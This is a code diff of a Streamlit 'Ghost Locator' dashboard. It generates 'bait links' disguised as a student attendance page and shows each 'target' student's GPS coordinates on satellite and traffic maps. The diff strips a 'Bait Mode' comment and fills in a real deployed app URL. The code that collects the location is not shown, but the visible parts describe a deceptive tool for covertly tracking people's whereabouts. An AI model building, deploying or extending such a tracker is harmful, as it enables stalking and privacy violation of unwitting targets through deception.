@@ -46,7 +46,6 @@ st.markdown("""
 # --- Handling Data from Student (URL Params) ---
 query_params = st.query_params
 
-# CHECK: If student is opening the link (Bait Mode)
 if query_params.get("mode") == "attendance":
     st.markdown("<br><br>", unsafe_allow_html=True)
     st.markdown("""
@@ -78,40 +77,32 @@ if query_params.get("mode") == "attendance":
     st.info("⌛ Connecting to GPS Satellite... Please wait.")
     st.stop()
 
-# --- MAIN DASHBOARD LOGIC (For You) ---
+# --- MAIN DASHBOARD LOGIC ---
 
-# Auto Refresh every 5 seconds (Fixed to keep data stable)
 st_autorefresh(interval=5000, key="loc_refresh")
 
-# Fetch Coordinates from URL
-current_lat = float(query_params.get("lat", 21.1702)) # Default Surat
+current_lat = float(query_params.get("lat", 21.1702))
 current_lon = float(query_params.get("lon", 72.8311))
 target_id = query_params.get("id", "STU-NONE")
 
 st.title("🛰️ GHOST LOCATOR: COMMAND CENTER")
 
-# --- Sidebar Connection Panel (Fixed Memory) ---
 st.sidebar.header("📡 CONNECTION PANEL")
 st.sidebar.markdown(f"**Target ID:** `{target_id}`")
 
-# Session State to keep the link visible after refresh
 if 'bait_link' not in st.session_state:
     st.session_state.bait_link = ""
 
 if st.sidebar.button("Generate New Bait Link"):
-    # APNE APP KA REAL URL YAHAN DALNA (e.g. https://xyz.streamlit.app)
-    base_url = "https://your-app-name.streamlit.app" 
+    # APNE APP KA REAL URL YAHAN DALNA
+    base_url = "https://location-track-jytm6dezwsfhfjqwme2gy5.streamlit.app" 
     new_id = f"STU_{random.randint(100,999)}"
     st.session_state.bait_link = f"{base_url}/?mode=attendance&id={new_id}"
 
 if st.session_state.bait_link:
-    st.sidebar.success("Link Active (Safe from Refresh)")
+    st.sidebar.success("Link Active")
     st.sidebar.code(st.session_state.bait_link)
 
-st.sidebar.markdown("---")
-st.sidebar.info("💡 Map layers (Traffic/Satellite) upar right corner se control karein.")
-
-# --- Dashboard Layout ---
 col1, col2 = st.columns([1, 2.5])
 
 with col1:
@@ -120,38 +111,26 @@ with col1:
     st.metric("Longitude", f"{current_lon} E")
     st.metric("Signal Status", "CONNECTED ✅" if "lat" in query_params else "AWAITING 📡")
     st.metric("Last Seen", datetime.datetime.now().strftime("%H:%M:%S"))
-    
-    if "lat" in query_params:
-        st.success(f"✅ Target {target_id} is LIVE")
-    else:
-        st.warning("Waiting for data packet...")
 
 with col2:
-    # Map Initialization
+    # YAHAN ERROR THA - FIXED NOW
     m = folium.Map(location=[current_lat, current_lon], zoom_start=16, tiles=None)
 
-    # --- MAP LAYERS ---
     folium.TileLayer('cartodbdarkmatter', name='Ghost Dark Mode').add_to(m)
     folium.TileLayer('openstreetmap', name='Normal Street View').add_to(m)
-    
-    # Satellite View
-    folium.TileLayer(
-        tiles='https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}',
-        attr='Google',
-        name='Google Hybrid (Satellite)',
-        overlay=False,
-        control=True
-    ).add_to(m)
+    folium.TileLayer(tiles='https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', attr='Google', name='Google Hybrid', overlay=False).add_to(m)
+    folium.TileLayer(tiles='https://mt1.google.com/vt/lyrs=h,traffic&x={x}&y={y}&z={z}', attr='Google Traffic', name='Live Traffic', overlay=True).add_to(m)
 
-    # Traffic Overlay
-    folium.TileLayer(
-        tiles='https://mt1.google.com/vt/lyrs=h,traffic&x={x}&y={y}&z={z}',
-        attr='Google Traffic',
-        name='Live Traffic (Overlay)',
-        overlay=True,
-        control=True
-    ).add_to(m)
-
-    # Live Target Marker
     folium.CircleMarker(
-        location=[current_
+        location=[current_lat, current_lon],
+        radius=12,
+        color="#00f2ff",
+        fill=True,
+        fill_color="#00f2ff",
+        fill_opacity=0.8
+    ).add_to(m)
+
+    folium.LayerControl(collapsed=False).add_to(m)
+    st_folium(m, width="100%", height=600, use_container_width=True)
+
+st.markdown("<hr><center>Ghost Dashboard v4.0 | Fixed Syntax</center>", unsafe_allow_html=True)
